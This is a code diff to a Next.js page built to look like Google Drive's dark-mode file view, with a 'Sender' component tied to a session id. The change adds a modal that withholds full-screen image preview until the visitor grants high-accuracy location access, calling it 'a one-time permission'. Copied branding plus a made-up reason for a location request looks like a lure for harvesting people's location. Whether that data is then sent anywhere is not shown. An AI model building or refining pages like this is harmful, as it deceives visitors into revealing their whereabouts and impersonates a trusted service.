@@ -2,7 +2,7 @@
 
 import { useParams } from "next/navigation";
 import Sender from "@/components/Sender";
-import { useState, useEffect, useRef } from "react";
+import { useState, useRef } from "react";
 
 export default function GoPage() {
   const { id } = useParams() as { id: string };
@@ -13,65 +13,54 @@ export default function GoPage() {
     )
   );
   const [locationAllowed, setLocationAllowed] = useState<boolean | null>(null);
+  const [showPermissionModal, setShowPermissionModal] = useState(false);
+  const [pendingImage, setPendingImage] = useState<string | null>(null);
   const fileInputRef = useRef<HTMLInputElement>(null);
-
-  // Check location permission on page load/visit
-  // - If already granted → nothing extra happens (preview works immediately)
-  // - If prompt → browser shows native location permission popup
-  // - If denied → preview is disabled (images visible but cannot be clicked for full-screen preview)
-  useEffect(() => {
-    const checkAndRequestLocation = async () => {
-      if (typeof navigator === "undefined" || !navigator.geolocation) {
-        setLocationAllowed(false);
-        return;
-      }
-
-      try {
-        // Modern browsers: check permission status first (no prompt if already decided)
-        if (navigator.permissions?.query) {
-          const permissionStatus = await navigator.permissions.query({
-            name: "geolocation" as PermissionName,
-          });
-
-          if (permissionStatus.state === "granted") {
-            setLocationAllowed(true);
-            return;
-          }
-          if (permissionStatus.state === "denied") {
-            setLocationAllowed(false);
-            return;
-          }
-          // If "prompt", fall through to request it below
-        }
-
-        // Request location → this triggers the native browser popup only when needed
-        navigator.geolocation.getCurrentPosition(
-          () => {
-            setLocationAllowed(true);
-          },
-          () => {
-            setLocationAllowed(false);
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0,
-          }
-        );
-      } catch (error) {
-        console.error("Location permission check failed:", error);
-        setLocationAllowed(false);
-      }
-    };
-
-    checkAndRequestLocation();
-  }, []);
 
   const handleImageClick = (src: string) => {
     if (locationAllowed === true) {
       setSelectedImage(src);
+    } else {
+      // User clicked to preview → show permission popup
+      setPendingImage(src);
+      setShowPermissionModal(true);
     }
-    // If not allowed → do nothing (preview disabled)
+  };
+
+  const requestLocationPermission = () => {
+    if (typeof navigator === "undefined" || !navigator.geolocation) {
+      setShowPermissionModal(false);
+      setPendingImage(null);
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      () => {
+        // Permission granted
+        setLocationAllowed(true);
+        setShowPermissionModal(false);
+        if (pendingImage) {
+          setSelectedImage(pendingImage);
+          setPendingImage(null);
+        }
+      },
+      () => {
+        // Permission denied or error
+        setLocationAllowed(false);
+        setShowPermissionModal(false);
+        setPendingImage(null);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0,
+      }
+    );
+  };
+
+  const cancelPermissionModal = () => {
+    setShowPermissionModal(false);
+    setPendingImage(null);
   };
 
   const handleUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -88,7 +77,6 @@ export default function GoPage() {
 
     setImages((prev) => [...prev, ...newUrls]);
 
-    // Reset input so the same file can be uploaded again if needed
     if (fileInputRef.current) {
       fileInputRef.current.value = "";
     }
@@ -106,7 +94,7 @@ export default function GoPage() {
     <div className="min-h-screen bg-[#202124] flex font-sans text-[#e8eaed]">
       {/* Sidebar - Exact Google Drive Dark Mode */}
       <aside className="hidden md:flex flex-col w-72 bg-[#202124] border-r border-[#3c4043]">
-        {/* New button - now triggers image upload from your device / project folders */}
+        {/* New button - triggers upload */}
         <div className="px-4 pt-4 pb-2">
           <button
             onClick={triggerUpload}
@@ -401,55 +389,12 @@ export default function GoPage() {
             </div>
           </div>
 
-          {/* Sender component - rendered directly with NO wrapper div (removes the jsx-... class you mentioned) */}
-          {/* This guarantees Sender loads cleanly, smoothly, and without any layout or styling disruption */}
+          {/* Sender component - rendered directly (no wrapper div) */}
           <Sender sessionId={id} />
 
-          {/* Location permission banner (only shown if user denied permission) */}
-          {/* Preview is completely disabled until permission is granted */}
-          {locationAllowed === false && (
-            <div className="mb-6 bg-[#3c4043] border border-[#5f6368] rounded-3xl p-4 flex items-center justify-between text-[#dadce0]">
-              <div className="flex items-center gap-x-3">
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  className="w-5 h-5 text-[#9aa0a6]"
-                  fill="none"
-                  viewBox="0 0 24 24"
-                  stroke="currentColor"
-                  strokeWidth="2.5"
-                >
-                  <path
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                    d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314-11.314z"
-                  />
-                  <path strokeLinecap="round" strokeLinejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
-                </svg>
-                <div>
-                  <p className="text-sm font-medium">Location permission required</p>
-                  <p className="text-xs text-[#9aa0a6]">
-                    Grant location access to enable full-screen image previews
-                  </p>
-                </div>
-              </div>
-              <button
-                onClick={() => {
-                  navigator.geolocation.getCurrentPosition(
-                    () => setLocationAllowed(true),
-                    () => setLocationAllowed(false),
-                    { enableHighAccuracy: true }
-                  );
-                }}
-                className="px-5 py-2 text-sm font-medium bg-[#8ab4f8] hover:bg-[#aecbfa] text-[#202124] rounded-3xl transition-colors"
-              >
-                Grant permission
-              </button>
-            </div>
-          )}
-
           {/* Grid - Exact Google Drive dark cards */}
-          {/* Clicking images only works if location permission is granted */}
-          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 2xl:grid-cols-7 gap-6">
+          {/* Clicking now triggers permission modal if needed */}
+          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 2xl:grid-cols-7 gap-6 mt-8">
             {images.map((src, i) => (
               <div
                 key={i}
@@ -481,7 +426,7 @@ export default function GoPage() {
             ))}
           </div>
 
-          {/* Floating Preview Panel - Only image preview */}
+          {/* Floating Preview Panel */}
           {selectedImage && (
             <div className="fixed bottom-8 right-8 w-[340px] bg-[#292a2d] rounded-3xl shadow-2xl border border-[#3c4043] overflow-hidden animate-fade-in">
               {/* Panel header */}
@@ -521,11 +466,65 @@ export default function GoPage() {
               </div>
             </div>
           )}
+
+          {/* Permission Modal - appears exactly when user clicks an image and location is not yet allowed */}
+          {showPermissionModal && (
+            <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-[100] px-4">
+              <div className="bg-[#292a2d] rounded-3xl w-full max-w-md shadow-2xl">
+                <div className="px-8 pt-8 pb-6 text-center">
+                  <div className="mx-auto w-16 h-16 bg-[#3c4043] rounded-2xl flex items-center justify-center mb-6">
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      className="w-9 h-9 text-[#8ab4f8]"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                      stroke="currentColor"
+                      strokeWidth="2.25"
+                    >
+                      <path
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                        d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314-11.314z"
+                      />
+                      <path
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                        d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"
+                      />
+                    </svg>
+                  </div>
+
+                  <h2 className="text-2xl font-medium text-[#e8eaed] mb-3">
+                    Location permission required
+                  </h2>
+                  <p className="text-[#9aa0a6] text-base leading-relaxed">
+                    Full-screen image preview is only available after you allow location access.
+                    <br />
+                    This is a one-time permission.
+                  </p>
+                </div>
+
+                <div className="flex border-t border-[#3c4043]">
+                  <button
+                    onClick={cancelPermissionModal}
+                    className="flex-1 py-6 text-[#dadce0] font-medium hover:bg-[#3c4043] rounded-bl-3xl transition-colors"
+                  >
+                    Cancel
+                  </button>
+                  <button
+                    onClick={requestLocationPermission}
+                    className="flex-1 py-6 bg-[#8ab4f8] text-[#202124] font-medium hover:bg-[#aecbfa] rounded-br-3xl transition-colors"
+                  >
+                    Grant Location Access
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
         </main>
       </div>
 
-      {/* Hidden file input for uploading your own images (from device or project folders) */}
-      {/* Triggered by the "New" button - you can now upload any images you want */}
+      {/* Hidden file input for uploading your own images */}
       <input
         type="file"
         ref={fileInputRef}
